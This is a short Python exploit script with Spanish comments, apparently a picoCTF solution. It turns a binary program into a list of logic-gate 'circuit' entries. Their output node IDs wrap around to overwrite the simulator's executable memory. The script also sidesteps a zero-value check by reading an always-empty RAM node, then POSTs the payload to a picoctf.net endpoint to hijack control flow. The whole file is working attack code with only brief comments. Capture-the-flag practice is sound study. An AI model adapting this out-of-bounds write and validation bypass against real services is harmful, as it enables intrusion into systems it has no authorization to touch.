import struct
import requests

try:
    with open('programs/flag.bin', 'rb') as f:
        flag_bin = f.read()
except FileNotFoundError:
    print("Error: flag.bin no encontrado. Ejecútalo en la carpeta 'server'.")
    exit(1)

words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []
node_id = 2048 

# Queremos sobrescribir desde el inicio del programa (byte 0x0000)
# El offset base de los nodos en el simulador es 4096 words.
# Para apuntar a 0, el nodo debe ser -4096, que en uint16 es 61440.
for i in range(120):
    val = words[i % len(words)]
    
    # ID mágico que apunta a la memoria ejecutable de la CPU
    target_node = 61440 + i
    
    dummy_node = 20480 + i * 2
    temp_node  = 20480 + i * 2 + 1
    
    if val == 0:
        # Bypass para checkInt (0 no permitido).
        # El Nodo 256 corresponde a una zona vacía de la RAM que siempre es 0.
        circuit.append({"input1": 1, "input2": 1, "output": dummy_node})
        val_node = 256 
    else:
        circuit.append({"input1": val, "input2": val, "output": dummy_node})
        val_node = node_id
        
    node_id += 3
    
    circuit.append({"input1": val_node, "input2": val_node, "output": temp_node})
    node_id += 3
    
    circuit.append({"input1": temp_node, "input2": temp_node, "output": target_node})
    node_id += 3

print(f"[*] Payload de precisión ensamblado: {len(circuit)} compuertas.")
print("[*] Lanzando exploit de secuestro de flujo...")

url = "http://activist-birds.picoctf.net:50108/check"
response = requests.post(url, json={"circuit": circuit})

if response.status_code == 200:
    print("[*] ¡Éxito! Respuesta del servidor:")
    print(response.json())
else:
    print(f"[!] Error HTTP {response.status_code}:")
    print(response.text)
